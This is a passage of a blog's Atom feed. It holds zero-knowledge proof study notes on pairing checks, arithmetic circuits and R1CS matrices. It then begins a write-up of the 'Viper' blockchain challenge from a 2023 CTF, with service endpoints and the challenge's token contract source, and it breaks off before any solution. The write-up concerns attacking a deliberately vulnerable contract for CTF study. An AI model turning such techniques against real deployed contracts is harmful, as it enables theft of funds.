&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; dG2_x1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;18029695676650738226693292988307914797657423701064905010927197838374790804409&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; dG2_x2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;14583779054894525174450323658765874724019480979794335525732096752006891875705&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; dG2_y1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2140229616977736810657479771656733941598412651537078903776637920509952744750&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; dG2_y2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11474861747383700316476719153975578001603231366361248090558603872215261634898&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory&lt;&#x2F;span&gt;&lt;span&gt; points &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;            aG1_x,
&lt;&#x2F;span&gt;&lt;span&gt;            aG1_y,
&lt;&#x2F;span&gt;&lt;span&gt;            bG2_x2,
&lt;&#x2F;span&gt;&lt;span&gt;            bG2_x1,
&lt;&#x2F;span&gt;&lt;span&gt;            bG2_y2,
&lt;&#x2F;span&gt;&lt;span&gt;            bG2_y1,
&lt;&#x2F;span&gt;&lt;span&gt;            cG1_x,
&lt;&#x2F;span&gt;&lt;span&gt;            cG1_y,
&lt;&#x2F;span&gt;&lt;span&gt;            dG2_x2,
&lt;&#x2F;span&gt;&lt;span&gt;            dG2_x1,
&lt;&#x2F;span&gt;&lt;span&gt;            dG2_y2,
&lt;&#x2F;span&gt;&lt;span&gt;            dG2_y1
&lt;&#x2F;span&gt;&lt;span&gt;        ];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; pairings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(points);
&lt;&#x2F;span&gt;&lt;span&gt;        console2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;result:&amp;quot;, x);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Its important to note that the ecPairing precompile does not expect or require an array and that our choice of using one with inline-assembly is simply optional.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Arithmetic Circuits</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-7/"/>
        <id>/blog/zknote/post-7/</id>
        
        <content type="html" xml:base="/blog/zknote/post-7/">&lt;h3 id=&quot;arithmetic-circuits&quot;&gt;Arithmetic Circuits&lt;&#x2F;h3&gt;
&lt;p&gt;Zk circuits form a set of constraints that if satisfied, prove a computation was carried out correctly. Zk circuits are sometimes called arithmetic circuits because the “gates” in the circuit are addition and multiplication over a finite field. We are only allowed to use these two operators as a &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;rings-and-fields&quot;&gt;finite field&lt;&#x2F;a&gt; only has these two operations.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;prove-a-inverse&quot;&gt;prove a inverse&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;field_size &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;29 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# some prime number
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;## Prover
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;compute_inverse&lt;&#x2F;span&gt;&lt;span&gt;(a):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field_size)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;22
&lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;compute_inverse&lt;&#x2F;span&gt;&lt;span&gt;(a)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;## Verifier
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;(a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;b) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;field_size &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;proving-a-binary-transformation&quot;&gt;Proving a binary transformation&lt;&#x2F;h3&gt;
&lt;p&gt;constrain 1&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;b1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;b1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;b2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;b2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;b3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;b3) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;b4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;b4) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;constrain 2&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;b1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;b2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;b3) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;b4) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== GIVEN_VALUE
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;proving-a-b&quot;&gt;Proving a &amp;gt; b&lt;&#x2F;h3&gt;
&lt;p&gt;Due to something like overflow or underflow in finite field, we could not simply check &lt;code&gt;a - b&lt;&#x2F;code&gt; or &lt;code&gt;b -a&lt;&#x2F;code&gt; to prove it.&lt;&#x2F;p&gt;
&lt;p&gt;but it could easily be done in curcuits since we could convert it into a comparison at the bit level.&lt;&#x2F;p&gt;
&lt;p&gt;Expand it:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Proving x is the maximum element in a list of elements: we could use it to check a list was properly sorted.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Proving a list contains no duplicates: we can ask the prover to sort the list (called &lt;strong&gt;auxiliary computations&lt;&#x2F;strong&gt;), verify it is sorted using the methodology from earlier, then check each element of the array to see if the entry next to it is equal.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;hash-functions&quot;&gt;hash functions&lt;&#x2F;h3&gt;
&lt;p&gt;If each step in the hash function can be proven to have been executed correctly, then the entire hash function can be proven to have been executed correctly, &lt;em&gt;&lt;strong&gt;without executing the hash function&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Proving each step of something like sha256 as a circuit is extremely non-trivial: it requires tens of thousands of constraints to prove every stage of this hash function.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Rank 1 Contraint Systems</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-8/"/>
        <id>/blog/zknote/post-8/</id>
        
        <content type="html" xml:base="/blog/zknote/post-8/">&lt;h3 id=&quot;rank-1-constraint-systems&quot;&gt;Rank 1 Constraint Systems&lt;&#x2F;h3&gt;
&lt;h3 id=&quot;witness-vector&quot;&gt;Witness vector&lt;&#x2F;h3&gt;
&lt;p&gt;A witness means we don’t just know every input parameter, we must know every intermediate variable in this expanded form.&lt;&#x2F;p&gt;
&lt;p&gt;For completeness of calculation, the witness vector starts with 1, followed by input, output and process variables&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;It’s based on the last episode &lt;code&gt;Arthimetic circuit&lt;&#x2F;code&gt;: If each step in the hash function can be proven to have been executed correctly, then the entire hash function can be proven to have been executed correctly, &lt;em&gt;&lt;strong&gt;without executing the hash function&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;. Similar situation here.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h3 id=&quot;polynomial-transformation&quot;&gt;Polynomial transformation&lt;&#x2F;h3&gt;
&lt;p&gt;Each row of our computation can only have one multiplication, so we must break up our equation as follows:&lt;&#x2F;p&gt;
&lt;p&gt;$$
out + (constants) = a\space*\space b\
or\
a\space*\space b - out + (constants) = 0
$$&lt;&#x2F;p&gt;
&lt;p&gt;and transform it to polynomial multiplication&lt;&#x2F;p&gt;
&lt;p&gt;$$
Cm = Am * Bm\
or\
Am * Bm -Cm = 0
$$&lt;&#x2F;p&gt;
&lt;p&gt;What needs to be done in the transformation is to configure appropriate parameters in the three vectors A, B, and C to comply with the constraints of the original polynomial.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;example&quot;&gt;Example&lt;&#x2F;h3&gt;
&lt;p&gt;5 example:&lt;&#x2F;p&gt;
&lt;p&gt;$$
(1)\space out=x&lt;em&gt;y\
(2)\space out=x&lt;&#x2F;em&gt;y&lt;em&gt;z&lt;&#x2F;em&gt;u\
(3)\space out=x*y+2\
(4)\space out=2x^2+y\
(5)\space out=3x^2y+5xy-x-2y+3
$$&lt;&#x2F;p&gt;
&lt;p&gt;The number of constraints(the number of occurrences of multiplication) is the minimum formula we need. More can be constructed by multiplying by one&lt;&#x2F;p&gt;
&lt;p&gt;$$
\space out=x * y\space(1\space constraints)\
\space out=x * y * z * u\space(3\space constraints)\
\space out=x * y+2\space(1\space constraints)\
\space out=2x ^ 2+y\space(1\space constraints)\
\space out=3x ^ 2y+5xy-x-2y+3\space(3\space constraints)
$$&lt;&#x2F;p&gt;
&lt;p&gt;and then break up it (only write the fifth one)&lt;&#x2F;p&gt;
&lt;p&gt;$$
out=3x^2y+5xy-x-2y+3\
=&amp;gt;\space\begin{equation}&lt;br &#x2F;&gt;
\left{
\begin{array}{* * lr * *}
v_1=3x * x, &amp;amp;\
v_2=v_1 * y, &amp;amp;\
-v_2 + x + 2y -3 + out = 5xy
\end{array}
\right.
\end{equation}
$$&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we should constructed matrix for the constructed system of equations&lt;&#x2F;p&gt;
&lt;p&gt;we let witness be  $w = \left[1\ out\ x\ y\ v_1\ v_2\right]$&lt;&#x2F;p&gt;
&lt;p&gt;and then construct as following:&lt;&#x2F;p&gt;
&lt;p&gt;$$
A = \begin{bmatrix}
0 &amp;amp; 0 &amp;amp; 3 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 \newline
0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 1 &amp;amp; 0 \newline
0 &amp;amp; 0 &amp;amp; 5 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 \newline
\end{bmatrix}\newline
B = \begin{bmatrix}
0 &amp;amp; 0 &amp;amp; 1 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 \newline
0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 1 &amp;amp; 0 &amp;amp; 0 \newline
0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 1 &amp;amp; 0 &amp;amp; 0 \newline
\end{bmatrix}\newline
C = \begin{bmatrix}
0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 1 &amp;amp; 0 \newline
0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 0 &amp;amp; 1 \newline
-3 &amp;amp; 1 &amp;amp; 1 &amp;amp; 2 &amp;amp; 0 &amp;amp; -1 \newline
\end{bmatrix}
$$&lt;&#x2F;p&gt;
&lt;p&gt;Substituting it into the formula( $Cm = Am * Bm$ ) and perform matrix multiplication could obtain the above system of equations&lt;&#x2F;p&gt;
&lt;h3 id=&quot;circom-implementation&quot;&gt;Circom implementation&lt;&#x2F;h3&gt;
&lt;p&gt;In Circom (and many other frameworks), math is done modulo &lt;code&gt;21888242871839275222246405745257275088548364400416034343698204186575808495617&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;and the above work can be completed through circom&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Zero Knowledge Proofs with Rank 1 Contraint Systems</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-9/"/>
        <id>/blog/zknote/post-9/</id>
        
        <content type="html" xml:base="/blog/zknote/post-9/">&lt;h3 id=&quot;zero-knowledge-proofs-with-rank-1-constraint-systems&quot;&gt;Zero Knowledge Proofs with Rank 1 Constraint Systems&lt;&#x2F;h3&gt;
&lt;p&gt;Last episode we write r1cs as the following:
$$
Cm = Am * Bm\
or\
Am * Bm -Cm = 0
$$
but here we write it as
$$
Ls⊙Rs=Os
$$
while ⊙ is the paring function(Hadamard product). nothing different bertween them.&lt;&#x2F;p&gt;
&lt;p&gt;If we “encrypt” the witness vector by multiplying each entry with G₁ or G₂, the math will still work properly.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;For a given verification process, the matrices L, R, and O used for verification are common to both parties in the communication.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;prover-steps&quot;&gt;Prover steps&lt;&#x2F;h3&gt;
&lt;p&gt;compute $Ls$ and $Rs$ in two different EC group(paring friendly)
$$
Ls = L * s * G_1 \
Rs = R * s * G_2
$$
then hand the results and the G1, G2 to &lt;code&gt;Verifier&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;verification-step&quot;&gt;Verification step&lt;&#x2F;h3&gt;
&lt;p&gt;Verify if $pairing(Ls, Rs) = pairing(Os, 1)$. For reduce the difficulty of calculation, we do not use $G_{12}$ to  directly encrypt $Os$ , because $G_{12}$ is a massive point.&lt;&#x2F;p&gt;
&lt;p&gt;And $pairing(Os, 1)$ could be $paring\left(O * s * G_1), G_2\right)$ or $paring\left(O * s * G_2), G_1\right)$ . The results are equivalent&lt;&#x2F;p&gt;
&lt;h3 id=&quot;public-inputs&quot;&gt;Public inputs&lt;&#x2F;h3&gt;
&lt;p&gt;some of our variable could be public (not encrypted on EC), like if we wants to prove $x³ + 5x + 5 = 155$, the $1$ and $out$ in the possible witness vector $[1, out, x, v]$ could be public.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Azure Assassin Alliance CTF 2023 Blockchain</title>
        <published>2023-11-01T00:00:00+08:00</published>
        <updated>2023-11-01T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/actf/"/>
        <id>/blog/actf/</id>
        
        <content type="html" xml:base="/blog/actf/">&lt;p&gt;This time my teammates from 0RAYS and I participated in Azure Assassin Alliance CTF 2023 and got third place🥉&lt;&#x2F;p&gt;
&lt;p&gt;I participated in solving some web and misc challenges. The web challenges is not very difficult and not very interesting, but the blockchain challenge really appeals to me. So I feel the necessity to write it down.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;viper&quot;&gt;Viper&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;yaml&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-yaml &quot;&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Description
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;When you encounter a viper, you need to be more careful to prevent injury
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Service
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Geth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;120.46.58.72:8545
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Faucet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;120.46.58.72:8080
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Playground&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;nc 120.46.58.72 20000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;source code:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;@openzeppelin&#x2F;contracts@4.0.0&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;@openzeppelin&#x2F;contracts@4.0.0&#x2F;access&#x2F;Ownable.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;VETH &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Ownable {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;VETH&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;vETH&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Ownable&lt;&#x2F;span&gt;&lt;span&gt;() {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;mint&lt;&#x2F;span&gt;&lt;span&gt;(address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256 amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# @version ^0.2.16
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;vyper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;interfaces &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import ERC20
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;event Deposit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
